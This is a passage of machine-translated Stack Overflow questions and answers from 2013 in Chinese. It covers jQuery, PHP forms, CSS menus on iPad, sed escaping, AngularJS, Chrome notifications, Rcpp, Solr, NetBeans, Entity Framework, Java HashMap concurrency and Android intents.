$(window).load(function() { 
   //Some Code
}); 
```

因此，一旦加载了所有内容，我就会执行`//Some Code`，但是我想这样做，因此如果未加载内容，可以说在 7 秒内（可能是大图像文件，或发生丢失文件等），`//Some Code`即使内容未完全加载，也要执行。我怎样才能完成这项任务？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T14:25:01.093

你可以这样做 ：

```
function someCode() {
    if (someCode.done) return;
    someCode.done = true;
    clearTimeout(t);
    // Some Code
}
var t = setTimeout(someCode, 7000);
$(window).load(someCode); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:50:29.970

由于延迟对象只能解决一次，因此可以用作解决方案：

```
var runCodeDeferred = $.Deferred(function(deferred){
    $(window).load(deferred.resolve);
    setTimeout(deferred.resolve,7000)
});

runCodeDeferred.done(function(){
    //Some Code
}); 
```

对象也可以这样做`$.Callbacks`：

```
var callbacks = $.Callbacks("once");
$(window).load(callbacks.fire);
setTimeout(callbacks.fire,7000);
callbacks.add(function(){
    //Some Code
}); 
```

但这与这样做没有什么不同：

```
var timer;
function someCode() {
    //Some Code
}
$(window).on("load.someCode",function(){
    clearTimeout(timer);
    someCode();
});
setTimeout(function(){
    $(window).off("load.someCode");
    someCode();
},7000); 
```

# php - Php：发布表单不起作用

> ID：15973867
> 
> 赞同：1
> 
> 时间：2013-04-12T14:23:18.243
> 
> 标签：php, html

好的，所以我在呼叫中心工作，我们有一个显示器可以显示每个呼叫者的休息时间。我是这家公司的新手，已经接到了为这台显示器制作网站的任务。

下面是我的php代码。我已经搜索了可能是什么问题的时间，但我似乎找不到它。

问题是：如果我单击按钮，那么我的表单不会被发布并且不会写入 csv。该代码以前工作过，所以在主要行中我知道我的代码是正确的。它一定是一些愚蠢而小的东西，但我就是找不到它。

我的代码：

```
<html>
<head>
<LINK REL="StyleSheet" HREF="Input_form.css">
<title>Verander Plaatsindeling</title>
<h1><center>Verander plaatsindeling<center></h1>
<hr/>
</head>
<body>
    <?php
        if(ISSET($_POST['submitMe']))
        {
        $csv = fopen("zitplaatsenAntwerpen.csv","w") or die("Kan csv niet vinden!");

        for($counter=1;$counter<=30;$counter++)
        {
            $naam = $_POST["Naam" .$counter];
            $project = $_POST["Project" .$counter];
            $csvrow = $counter . ";" . $naam . ";" . $project . "\n";
            fwrite($csv, $csvrow);
        }
    ?>
     <?php
            fclose($csv);
            echo "<SCRIPT LANGUAGE='JavaScript'>
            <!--
            window.alert('Gegevens ingeladen!')
            // -->
            </SCRIPT>";
            $informatie = array();
            $f = fopen("ZitplaatsenAntwerpen.csv","r") or die("Kan csv niet vinden!");

            while (!feof($f))
            {
                $arrM = explode(";",fgets($f));
                $informatie[$arrM[0]]["Nummer"] = ucwords($arrM[0]);
                $informatie[$arrM[0]]["Naam"] = ucwords($arrM[1]);
                $informatie[$arrM[0]]["Project"] = ucwords($arrM[2]);
            }
            fclose($f);
        }
        else
        {
            $informatie = array();
            $f = fopen("ZitplaatsenAntwerpen.csv", "r")  or die("Kan csv niet vinden!");

            while (!feof($f))
            {
            $arrM = explode(";",fgets($f));
            $informatie[$arrM[0]]["Nummer"] = ucwords($arrM[0]);
            $informatie[$arrM[0]]["Naam"] = ucwords($arrM[1]);
            $informatie[$arrM[0]]["Project"] = ucwords($arrM[2]);
            }
            fclose($f);
        }
     ?>
     <div style="word-spacing:7em;" align:center>
      Nummer    Naam    Project
     </div>

    <pre><form action="<?php echo $PHP_SELF;?>" method="post">
    <?php
        for ($teller = 1;$teller<=30; $teller++)
        {
                if(!empty($informatie[$teller]))
                {
                    echo "<div align:center>";
                    echo  "     " . $teller . "   ";
                    echo "<input type='text' name='Naam" .$teller. "' value='";
                    echo $informatie[$teller]["Naam"] . "'>";
                    echo "<input id='" .$teller. "' ";
                    echo "<input type='text' name='Project" .$teller. "' value='";
                    echo $informatie[$teller]["Project"] . "'>";
                    echo "</div>";
                }
                else
                {
                    echo "<div align:center>";
                    echo "      " . $teller . "   ";
                    echo "<input type='text' name='Naam" .$teller. "' value='";
                    echo $informatie[$teller]["Naam"] . "'>";
                    echo "<input id='" .$teller. "' ";
                    echo "<input type='text' name='Project" .$teller. "' value='";
                    echo $informatie[$teller]["Project"] . "'>";
                    echo "</div>";
                }
        }
    ?>
    </form></pre>
<div align="center">
<button style="width:100;height:50" type="submit" name="submitMe">Opslaan</button>
</div>
</body>
</html> 
```

任何帮助，将不胜感激。谢谢大家

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:25:56.123

更改此 PHP

```
if(ISSET($_POST['submitMe'])) 
```

有了这个：

```
if(isset($_POST['submitMe'])) 
```

您在关闭表单后放置了提交按钮，尝试进行如下操作：

```
<input type="submit" style="width:100;height:50"  name="submitMe" value="Opslaan">
</form> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:24:42.250

您的提交按钮在您的`<form>`标签之外。查看页面的源代码，您会注意到它呈现为：

```
<form>
....
</form>
<button...> 
```

应该位于`button`表单标签内：

```
<form>
<button ...>
</form> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:27:19.007

这段代码错了，

```
<button style="width:100;height:50" type="submit" name="submitMe">Opslaan</button> 
```

你应该使用

```
<input style="width:100;height:50" type="submit" name="submitMe" value="Opslaan" /> 
```

# jquery - JQuery .sortable("cancel") - 如何获取被移动的项目？

> ID：15973868
> 
> 赞同：0
> 
> 时间：2013-04-12T14:23:18.167
> 
> 标签：jquery, jquery-ui

我是 jQuery 的新手。我搜索了文档和stackoverflow，但找不到答案。单击按钮时，我需要取消可排序列表中的最后一次更改，它可以工作。

我还需要获取已移动到其先前位置的元素（或它的 id）。我该怎么做？

我的代码：

```
<script type="text/javascript">
$(function(){
  $("#sortable").sortable({
    placeholder: "ui-state-highlight",
    opacity: 0.6
  });
  $("#cancelSort").click(function(){
    $("#sortable").sortable("cancel");
  });
});
</script>

<button id="cancelSort">Cancel Sort</button> 
```

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T16:51:48.170

创建一个变量，使用[`stop event`](http://api.jqueryui.com/sortable/#event-stop)，并将变量设置为`ui.item`。

```
$(function(){
    var last_el=null,
        last_id=null;

  $("#sortable").sortable({
      placeholder: "ui-state-highlight",
      opacity: 0.6,
      stop: function( event, ui ){
        last_el = $(ui.item);  //element
        last_id = $(ui.item).attr('id'); //element_id
      }
  });

  $("#cancelSort").click(function(){
     $("#sortable").sortable("cancel");
     console.log(last_el, last_id);
  });
}); 
```

演示：http: [//jsfiddle.net/dirtyd77/Tmdmq/](http://jsfiddle.net/dirtyd77/Tmdmq/)

注意：如果您不熟悉`console.log`，请转到此[链接](https://stackoverflow.com/questions/4743730/what-is-console-log-and-how-do-i-use-it)。

# css - 仅 CSS 下拉菜单不喜欢 iPad 等。跟随菜单链接而不显示菜单

> ID：15973869
> 
> 赞同：2
> 
> 时间：2013-04-12T14:23:21.383
> 
> 标签：css, ipad, drop-down-menu, touch

我们在这里创建了一个新网站 www.worthingleisure.co.uk/splashpoint

它在顶部有一个纯 CSS 菜单，通过使用 li:hover ul 方法并适当地显示和隐藏，它应该适用于 iPad、iPhone 和其他基于触摸的设备。

但是，例如，如果您点击“设施”，它会跟随链接，并且在加载“设施”页面时只会暂时显示菜单。如果您回击，则菜单显示正常！我确信这曾经可以正常工作，但现在已停止工作。

我已经画了一个空白并尝试了一切以使其成为“点击”打开菜单，“第二次点击”遵循超链接的 URL 并绘制空白，包括按照其他地方的建议将“onclick ='return false'”放在 li 项目中.

有没有人有任何想法，我整个上午都在研究这个问题，但无法找到答案，但其他仅 CSS 的菜单工作得非常好，我无法理解它们和我们的菜单有什么不同。

非常感谢，维姬

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T16:14:57.367

好的，所以这是其他人所说的高潮。您可以在 iPad 上制作悬停效果，但这取决于具体情况。它不适用于您的原因是因为“设施”菜单项也是一个链接。因此，当您按下它时，它会触发悬停和点击（这就是您返回页面时看到它的原因）。

如果设施是一个跨度并且仍然具有正确的 CSS 悬停，那么它会起作用，因为您正在点击它但没有点击链接。

由于您可能希望像其他人建议的那样保留这些父类别链接，因此您希望使用 Javascript/jQuery 来抑制默认操作（但仅适用于触摸事件设备，因为您不希望它在具有鼠）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-23T07:49:02.517

我有同样的问题。这个页面帮助解释了一些关于 iOS 如何处理`:hover`状态的事情：

**[http://www.nczonline.net/blog/2012/07/05/ios-has-a-hover-problem/](http://www.nczonline.net/blog/2012/07/05/ios-has-a-hover-problem/)**

基本上，如果`:hover`规则更改了子元素的`display`or ，iOS 将触发悬停状态而不是立即加载链接。`visibility`

然后我还意识到，当悬停状态涉及 CSS 转换时，iOS 会立即加载链接，而不是在悬停状态上暂停。所以我不得不通过[有条件地在 body 上应用一个类](https://stackoverflow.com/a/18397475/195835)来禁用我的 iOS 转换......

```
.ios .nav li ul {
    -webkit-transition: none;
    transition: none;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-26T16:48:13.633

正如您设置的问题中所述`onClick="return false"`，我想应该是这样`onClick="return true"`。无论如何，这解决了我的问题，虽然这个问题很老，但我希望这对某人有所帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-17T20:11:43.973

我在这里发布了一个解决方案（涉及检测单击 + 悬停事件之间的延迟时间差异）：[Mobile (touch) device friendly dropdown menu in css / jquery](https://stackoverflow.com/questions/11850466/mobile-touch-device-friendly-drop-down-menu-in-css-jquery/17707936#17707936)

# php - 转义 SED 命令

> ID：15973876
> 
> 赞同：0
> 
> 时间：2013-04-12T14:23:38.427
> 
> 标签：php, linux, sed, escaping

我正在尝试运行一个脚本来替换很多 .php 文件中的一段代码。我需要更换：

```
`popupOpen(\'/home/open.php?c='.urlencode($row['id']).'&s=\', 650, 600)` 
```

有了这个：

```
`popupOpen(\'/home/open.php?c='.urlencode($row['id']).'&s=\', 1024, 750)` 
```

我正在使用的命令是：

```
find . -name "index.php" -print | xargs sed -i "s/popupOpen(\\\'\/home\/open.php?c='.urlencode\($row\['id']\).'\&s=\\\', 650, 600)/popupOpen(\\\'\/home\/open.php?c='.urlencode\($row\['id']\).'\&s=\\\', 1024, 750)/g" 
```

我似乎无法正确逃避它。我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-13T05:39:11.820

你可以没有`xargs`：

```
find .name "index.php" -exec sed -i '' sed "whatever" {} \; 
```

在这种情况下，我认为这会起作用：

```
find . -name "index.php" -exec sed "s|popupOpen(\\\\'/home/open\.php\?c=\'\.urlencode(\\\$row\[\'id\'\])\.\'&s=\\\\', 650, 600)|popupOpen(\\\\'/home/open\.php\?c=\'\.urlencode(\\\$row\[\'id\'\])\.\'\&s=\\\\', 1024, 750)|g" {} \; 
```

# javascript - 如何使用最常见的代码重构 angularjs 控制器

> ID：15973879
> 
> 赞同：7
> 
> 时间：2013-04-12T14:23:46.970
> 
> 标签：javascript, angularjs, refactoring, ng-controller

我对 angularjs 比较陌生。我有一些代码（HTML + JS）允许用户从范围内的数组中添加和删除条目。但是现在我正在为不同的数组大量重复代码。我知道这可以重新考虑，但我不确定角度方法，除了我可能想要使用指令这一事实。非常感谢任何帮助。

**的HTML**

```
<div class="control-group" ng-class="{error: form.profile.seeking.$invalid}" ng-controller="SeekingCtrl">
    <label class="control-label" for="profile.seeking">Seeking</label>
<div class="controls">
    <ul ng-repeat="seeks in profile.seeking">
      <li>{{seeks}} <button class="btn" ng-click="removeSeeks()">Remove</button></li>
    </ul>
    <input type="text" ng-model="newseeks" id="profile.seeking">
    <button class="btn" ng-disabled="!newseeks" ng-click="addSeeks()">Add new</button>
</div> 
```

```
<div class="control-group" ng-class="{error: form.project.offering.$invalid}" ng-controller="OfferingCtrl">
<label class="control-label" for="project.offering">Offering</label>
<div class="controls">
    <ul ng-repeat="offer in project.offering">
      <li>{{offer}} <button class="btn" ng-click="removeOffer()">Remove</button></li>
    </ul>
    <input type="text" ng-model="newoffer" id="project.offering">
    <button class="btn" ng-disabled="!newoffer" ng-click="addOffer()">Add new</button>
</div> 
```

**Javascript**

```
var SeekingCtrl = function($scope) {
$scope.addSeeks = function() {
    $scope.profile.seeking = $scope.profile.seeking || [];
    $scope.profile.seeking.push($scope.newseeks);
    $scope.newseeks = "";
};

$scope.removeSeeks = function() {
    $scope.profile.seeking = _.without($scope.profile.seeking, this.seeks);
};
};

var OfferingCtrl = function($scope) {
$scope.addOffer = function() {
    $scope.project.offers = $scope.project.offers || [];
    $scope.project.offers.push($scope.newoffer);
    $scope.newoffer = "";
};

$scope.removeOffer = function() {
    $scope.project.offers = _.without($scope.project.offers, this.offer);
};
}; 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-05-28T10:04:02.520

终于想通了。

**的HTML**

```
<div list-editor list="profile.skills" label="Skills">
</div> 
```

**指令**

```
<div class="control-group" ng-controller="ListEditorCtrl">
    <label class="control-label" for="{{list}}">{{label}}</label>
    <div class="controls">
    <ul ng-repeat="item in list">
        <li>{{item}} 
            <button class="btn" ng-click="removeItem()"><i class="icon-remove"></i></button>
            <button class="btn" ng-show="!$first" ng-click="moveUpItem()"><i class="icon-chevron-up"></i></button>
            <button class="btn" ng-show="!$last" ng-click="moveDownItem()"><i class="icon-chevron-down"></i></button>
        </li>
    </ul>
    <input type="text" ng-model="newitem" id="{{list}}" />
    <button class="btn" ng-disabled="!newitem" ng-click="addItem()">Add new</button>
</div> 
```

```
p4pApp.directive('listEditor', function () {
    return {
        restrict: 'A',
        scope: {
            list: '='
        },
        templateUrl: '/templates/common/list_editor_directive.html',
        link: function(scope, element, attrs) {
            scope.label = attrs.label;
        }
    };
}
); 
```

**控制器**

```
var ListEditorCtrl = function($scope) {
$scope.addItem = function() {
    $scope.list = $scope.list || [];
    $scope.list.push($scope.newitem);
    $scope.newitem = "";
};

$scope.removeItem = function() {
    $scope.list.splice(_.indexOf($scope.list, this.item),1);
};
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T21:12:47.993

你的问题对我来说不够清楚，如果你把一个更容易理解的示例代码放在一个[plunker](http://plnkr.co/edit/gist:3510140)上会更好，但我会试着从我的理解中回答。
在你的 services.js 文件中做这样的事情：

```
app.factory('Seeks', ['$http', function($http){
  var Url  = "seeks.json";
  var Seeks = $http.get(Url).then(function(response){
     return response.data;
  });
  return Seeks;
}]);
app.factory('Offers', ['$http', function($http){
  var Url  = "offers.json";
  var Offers = $http.get(Url).then(function(response){
     return response.data;
  });
  return Offers;
}]); 
```

在你的 controllers.js 中做这样的事情：

```
var SeekingCtrl = function($scope, Seeks) {
  Seeks.then(function(data){
    $scope.seeks = data;
  });
  $scope.addSeeks = function(newseeks) {
      $scope.seeks.push(newseeks);
      newseeks = "";
  };

  $scope.removeSeeks = function(seek) {
      $scope.seeks = _.without($scope.seeks, seek);
  };
};

var OfferingCtrl = function($scope, Offers) {
  Offers.then(function(data){
    $scope.offers = data;
  });
  $scope.addOffer = function(newoffer) {
      $scope.offers.push(newoffer);
      newoffer = "";
  };

  $scope.removeOffer = function(offer) {
      $scope.offers = _.without($scope.offers, offer);
  };
}; 
```

并且不要忘记将`Offers`和注入`Seeks`到 app.js 文件中的控制器中，如下所示：

```
SeekingCtrl.$inject  = ['$scope', 'Seeks'];
OfferingCtrl.$inject = ['$scope', 'Offers']; 
```

## 更新：

只需将所有内容放在一个控制器中，如下所示：

```
var MainCtrl = function($scope, Seeks, Offers) {
  Seeks.then(function(data){
    $scope.seeks = data;
  });
  Offers.then(function(data){
    $scope.offers = data;
  });
  $scope.addSeeks = function(newseeks) {
      $scope.seeks.push(newseeks);
      newseeks = "";
  };
  $scope.addOffer = function(newoffer) {
      $scope.offers.push(newoffer);
      newoffer = "";
  };
  $scope.removeSeeks = function(seek) {
      $scope.seeks = _.without($scope.seeks, seek);
  };
  $scope.removeOffer = function(offer) {
      $scope.offers = _.without($scope.offers, offer);
  };
}; 
```

## 更新2：

```
var MainCtrl = function($scope, Seeks, Offers) {
  Seeks.then(function(data){
    $scope.seeks = data;
  });
  Offers.then(function(data){
    $scope.offers = data;
  });
  $scope.add = function(item, type) {
      $scope[type].push(item);
      item = "";
  };
  $scope.remove = function(item, type) {
      $scope[type] = _.without($scope[type], item);
  };
}; 
```

类型可以是搜索或报价。
对于超出我范围的服务。
希望这有帮助。

# javascript - 如何重置 Chrome 桌面通知的请求权限

> ID：15973880
> 
> 赞同：18
> 
> 时间：2013-04-12T14:23:49.200
> 
> 标签：javascript, html, google-chrome

`window.webkitNotifications.requestPermission()` *最初*向用户显示提示，要求他们使用`Allow`or `Deny`。有一次，当我的通知出现时，我点击了小扳手，然后点击了`Disable from http://example.com`选项。

然后，`window.webkitNotifications.requestPermission()`不再提示我。我是否永久阻止我的网站接收甚至允许请求许可？我什至进入 Chrome 设置并选择“允许来自所有站点的通知”。

我怎样才能让那个提示再次出现？目前，`.checkPermission()`是`1`，我想再做`0`一次。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-12T14:47:54.853

您仅在本地禁用了该网站的通知。所以只有你会有这个“问题”，其他用户会没事的。

关于 Chrome 设置为“允许来自所有站点的通知”，这将只允许网站请求权限，但在您的情况下......您已经专门为该域禁用了通知。

要重新启用它，请按照下图中的示例查找每个域的权限设置的方法。在那里，您可以看到“通知”。只需更新您的设置，您就可以开始了；）

更多信息请访问：http: [//support.google.com/chrome/bin/answer.py ?hl=en&answer=95617](http://support.google.com/chrome/bin/answer.py?hl=en&answer=95617)

![权限](https://i.stack.imgur.com/Fhtgu.jpg)

# r - 为什么我不能将扩展 R 与 Rcpp 一起使用？

> ID：15973881
> 
> 赞同：1
> 
> 时间：2013-04-12T14:23:49.760
> 
> 标签：r, rcpp

```
#include "rcpp_add.h"
using namespace Rcpp ;

SEXP rcpp_add(SEXP a, SEXP b)
{

  std::vector< std::map<std::string,int> > v;
  std::map<std::string,int> m1;
  std::map<std::string,int> m2;

  int ax=Rcpp::as<int>(a);
  int bx=Rcpp::as<int>(b);

  m1["a"]=ax;
  m1["b"]=bx;

  m2["c"]=2;
  m2["d"]=20;

  v.push_back(m1);
  v.push_back(m2);

  return Rcpp::wrap(v);
} 
```

这段代码可以交互式加载`R`，但在我使用时它会告诉我错误`SEXP a, SEXP b`。为什么？当我不使用该功能时，该功能在环境`SEXP a, SEPX b`中是正确的`R`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:32:58.397

您对错误消息的描述没有多大意义，但这是一个适合我的更简单的版本：

```
#include "Rcpp.h"
using namespace Rcpp;

// [[Rcpp::export]]
List rcpp_add(int a, int b) {

  std::vector< std::map<std::string,int> > v;
  std::map<std::string,int> m1;
  std::map<std::string,int> m2;

  m1["a"] = a;
  m1["b"] = b;

  m2["c"] = 2;
  m2["d"] = 20;

  v.push_back(m1);
  v.push_back(m2);

  return Rcpp::wrap(v);
} 
```

# solr - Solr 服务器 HttpParse 错误

> ID：15973884
> 
> 赞同：2
> 
> 时间：2013-04-12T14:23:53.683
> 
> 标签：solr, jetty, solrcloud

嗨，当我使用 http 客户端向 solr 服务器发送查询时，solr 服务器会打印异常日志，说明 HttpParser 已满。

我在码头服务器上运行 solrcloud 4.0。这是码头的问题吗？

这可能是什么原因，我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T12:37:34.780

我怀疑您正在生成一个对于码头缓冲区默认大小来说太长的 url。

*   码头 6 - [http://docs.codehaus.org/display/JETTY/Configuring+Connectors](http://docs.codehaus.org/display/JETTY/Configuring+Connectors)
*   码头 7,8 - [http://wiki.eclipse.org/Jetty/Howto/Configure_Connectors](http://wiki.eclipse.org/Jetty/Howto/Configure_Connectors)
*   码头 9 - [http://www.eclipse.org/jetty/documentation/current/configuring-connectors.html#jetty-connectors-http-configuration](http://www.eclipse.org/jetty/documentation/current/configuring-connectors.html#jetty-connectors-http-configuration)

# java - Java - Netbeans 应用程序 - 如何使用 Lookup 传输数据？

> ID：15973886
> 
> 赞同：0
> 
> 时间：2013-04-12T14:23:56.977
> 
> 标签：java, lookup, netbeans-platform, listeners

在 Netbeans 平台（7.3）中发现 Lookup 库后，我想知道：（如何）从查找中删除对象？有垃圾收集之类的吗？

我注意到每次向 Lookup 添加对象时，该对象从未从 Lookup 中“释放”，这是非常合乎逻辑的，因为它的目的是保留对象。

浏览了一段时间（Geertjan 的博客、DZone、NB API 文档等，而不仅仅是“哦，我在 Google 中找不到它！”），我没有找到如何从查找中删除元素，例如。一条消息，将通过 Lookup 发送并在所有侦听器使用后删除。

这向我介绍了这些问题：如何确保给定的“收听顺序”，以及如何知道对象已被所有收听者“阅读”？

我觉得我想错了如何使用它。

欢迎每一个想法、链接或提示！

**编辑**

今晚我在想这个问题，我看到了如何用另一种方式重新表述它：

是否可以将查找管理器*不仅*用作服务目录/索引，还可以用作*消息传递服务*？网上的文档没有给我答案。

因为我会使用它（这就是为什么我写*“我觉得我对如何使用它的想法错了。”*），我会将消息放入查找以在其他地方触发操作，但这意味着每个消息只能读取一次监听器，然后被销毁。

主要问题是关于通过查找*传输*数据而不仅仅是*存储*它。

我找到了[这篇关于查找数据传输的简短文章](http://netbeans.dzone.com/articles/netbeans-platform-lookups)，但对我来说这听起来不对，因为对象似乎从未从查找中释放。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T11:55:50.190

我会反过来做。我会将侦听器注册为#ServiceProvider。生成 Object 的部分将从全局查找中请求所有侦听器并调用它们。

另一种方式可能是使用 InstanceContent。但这可能会导致合同过于宽松。

# entity-framework - 实体框架：列表 如何挂钩 entity.PropertyChanged

> ID：15973887
> 
> 赞同：0
> 
> 时间：2013-04-12T14:23:58.730
> 
> 标签：entity-framework, c#-4.0, entity-framework-4

有没有更好的方法来连接 PropertyChanged？

```
List<VisitorHost> _hosts = context.VisitorHosts.Where(a => a.Clients_Id == client.Id).Where(a => a.Inactive == false).ToList();
foreach (VisitorHost vh in _hosts)
   {  
   vh.PropertyChanged += new PropertyChangedEventHandler (visitorhost_PropertyChanged);
   } 
```

此 _hosts 附加到 BindingSource：

```
visitorhostBindingSource.DataSource = _hosts; 
```

BindingSource 附加到 DataGridView：

```
visitorHostsDataGridView.DataSource = visitorhostBindingSource; 
```

我要做的就是启用保存和回滚按钮（并设置一个标志，以便在我离开时提醒我保存），似乎我正在做的事情非常基本，但我只是不知道答案.

```
void visitorhost_PropertyChanged (object sender, System.ComponentModel.PropertyChangedEventArgs e)
   {
   if (!flgLoading) // Don't update if initialization
      {
      SetModified ();  // turn on buttons and update Flag for parent container 
      }
   } 
```

# javascript - 如何在MVC3中的JavaScript中的RouteUrl中给出数组字符串

> ID：15973895
> 
> 赞同：0
> 
> 时间：2013-04-12T14:24:22.633
> 
> 标签：javascript, nopcommerce, asp.net-mvc-3-areas

在单击 CheckBox 后，我在 MVC3 中使用 RouteUrl for window.location.href 和 JavaScript，我有多个复选框，我在 selectedValues 中获取所有选中的复选框值，然后将 RouteUrl 作为参数传递，但它给出错误...

```
<script type="text/javascript" language="javascript">
//Get value of selected items
function GetSelectedValue() {

    var selectedValues = [];

    $("[id*=CheckBoxList1] input:checked").each(function () {
        selectedValues.push($(this).val());
    });

    var s = sele.tos();

    if (selectedValues.length > 0) 
    {
        // alert("Checkbox selected value(s): " + selectedValues);

     window.location.href = 'Url.RouteUrl("MultipleManufacturer", new { manufacturerId = selectedValues })';

    } 
    else
    {
        alert("No item has been selected.");
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T05:26:49.273

我得到了答案...

```
function GetSelectedValue() {

    var selectedValues = [];

    $("[id*=CheckBoxList1] input:checked").each(function () {
        selectedValues.push($(this).val());
    });

    if (selectedValues.length > 0) {

        var url = '@Url.RouteUrl("MultipleManufacturer", new { manufacturerId = "_documentId_"})';
        var finalUrl = url.replace('_documentId_', selectedValues);

        window.location.href = finalUrl;

    } 
```

# java - 调整大小时多线程环境中的哈希图

> ID：15973896
> 
> 赞同：8
> 
> 时间：2013-04-12T14:24:23.700
> 
> 标签：java, hashmap

我正在关注一个教程，它基本上解释了在多线程环境中调整 Hashmap 大小时发生的竞争条件的原因：

> 在 Java 中，如果两个线程同时发现现在 HashMap 需要调整大小并且它们都尝试调整大小。在Java中调整HashMap大小的过程中，存储在链表中的bucket中的元素在迁移到新bucket期间会按顺序颠倒，因为java HashMap不会将新元素附加到尾部，而是将新元素附加到头部避免尾部遍历。如果发生竞态条件，那么您将最终陷入无限循环

阅读本文后，我有两个问题：

1.  为什么每个桶的链表顺序颠倒？
2.  我可以看到可能存在竞争条件，但看不到无限循环是如何产生的？是不是因为一个线程可能会从头到尾追加元素，而另一个线程则以相反的顺序执行？

请帮我澄清一下，非常感谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-12T17:43:58.180

**您的第一个问题的答案在引用的文本中：**

> “因为java HashMap不会在尾部追加新元素，而是在头部追加新元素以避免尾部遍历”

如果 HashMap 以插入顺序存储它们，它必须在每次插入时遍历列表或存储一个指向列表末尾的额外指针（并维护它）。无论如何，按插入顺序将元素存储在桶中不会带来任何好处（至少我想不出任何好处）。

**您的第二个问题的答案取决于这里：**

[http://mailinator.blogspot.hu/2009/06/beautiful-race-condition.html](http://mailinator.blogspot.hu/2009/06/beautiful-race-condition.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T14:37:51.477

实际上至少有一个与*rehashing*相关的竞争条件。看看这个代码片段（它来自 Sun JDK7）：

```
boolean oldAltHashing = this.useAltHashing;
this.useAltHashing |= sun.misc.VM.isBooted() && (this.newCapacity >= Holder.ALTERNATIVE_HASHING_THRESHOLD);
boolean rehash = oldAltHashing ^ this.useAltHashing;
transfer(newTable, rehash);
this.table = newTable; 
```

这里有可能线程 T1 结束，`rehash = true`线程 T2 结束`rehash = false`（假设 T1 已经改变了 的值`this.useAltHashing`）。

现在，猜猜哪个线程会写`this.table`- 你不知道，也可以。因此，您是否获得一致的内部状态是一个运气问题。

无论如何，正如我在**设计评论中提到的那样，不应该在多线程环境中使用 HashMap**。不起作用。要么是因为这个，要么是因为其他的原因。以上只是**你不应该试图违背合同的一个例子。**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:37:02.960

我不知道这个例子是否有效。很明显，它是特定于实现的。我认为它也错过了更大的图景。

`HashMap`的[合同](http://docs.oracle.com/javase/7/docs/api/java/util/HashMap.html)明确状态（强调他们的）：

> 如果多个线程同时访问一个哈希映射，并且至少有一个线程在结构上修改了映射，则*必须*在外部进行同步。（结构修改是添加或删除一个或多个映射的任何操作；仅更改与实例已包含的键关联的值不是结构修改。）

如果您违反合同，所有赌注都将取消。地图可以以任意、未指定的方式随意炸毁。

# ruby-on-rails-3 - 将 2 个实例绑定到一个表单 - netzke

> ID：15973897
> 
> 赞同：0
> 
> 时间：2013-04-12T14:24:38.837
> 
> 标签：ruby-on-rails-3, netzke

我使用 netzke 设计了一个表格。在同一页面中重复相同的表格。提交此表单时，两个对象都应保存到 DB。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-15T09:16:10.153

您可以在表单 A 的事件中添加一个公共父组件中的侦听器，`apply`然后`onApply`在表单 B 上调用。反之亦然，但不要忘记检查表单是否未加载，`onApply`然后才调用：

```
var formA = this. getComponent('...').getView(),
  formB = this. getComponent('...').getView();

formA.on('apply', function(){
  formA.isLoading = true;
  if(!formB.isLoading){
    formB.onApply();
  }
  formA.isLoading = false;
}, this);

formB.on('apply', function(){
  formB.isLoading = true;
  if(!formA.isLoading){
    formA.onApply();
  }
  formB.isLoading = false;
}, this); 
```

# java - android意图未激活

> ID：15973898
> 
> 赞同：3
> 
> 时间：2013-04-12T14:24:39.963
> 
> 标签：java, android, xml, android-intent

当我单击按钮时，我没有激活转到另一个 android 页面的意图。

我的java代码

```
public class CharSheets extends Activity implements OnClickListener{

    Button Descrip, Atributes, Weapons, Skills, ACItems, Gear,
        Feats, SpecialAbilities, Spells;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.charsheets);
        setids();
    }

    private void setids() {
        // TODO Auto-generated method stub
        Descrip = (Button)findViewById(R.id.bCharDescrip);
    }

    @Override
    public void onClick(View arg0) {
        // TODO Auto-generated method stub
        switch(arg0.getId()) {
        case R.id.bCharDescrip:
            Intent i = new Intent(CharSheets.this, CharDescrip.class);
            startActivity(i);
            break;
        case R.id.bCharAtributes:
            Intent i1 = new Intent(CharSheets.this, CharAtributes.class);
            startActivity(i1);
            break;
        }
    }
} 
```

XML 盛会

```
<activity
    android:name=".CharAtributes"
    android:label="@string/app_name" >
    <intent-filter>
        <action android:name="android.intent.action.CHARSATRIBUTES" />

        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
<activity
    android:name=".CharDescrip"
    android:label="@string/app_name" >
    <intent-filter>
        <action android:name="android.intent.action.CHARDESCRIP" />

        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity> 
```

我不确定是什么导致了这个问题，但我尝试了其他解决方案，但都没有奏效。我现在这样做的方式我以前用过，而且效果很好。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:28:20.070

您尚未将 应用于`OnClickListener`您的按钮。

```
private void setids() {
    // TODO Auto-generated method stub
    Descrip = (Button)findViewById(R.id.bCharDescrip);
    Descrip.setOnClickListener(this); // <--- This line is required.
} 
```

作为旁注，通常的做法是命名以小写字母开头的变量，例如描述

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T14:28:30.387

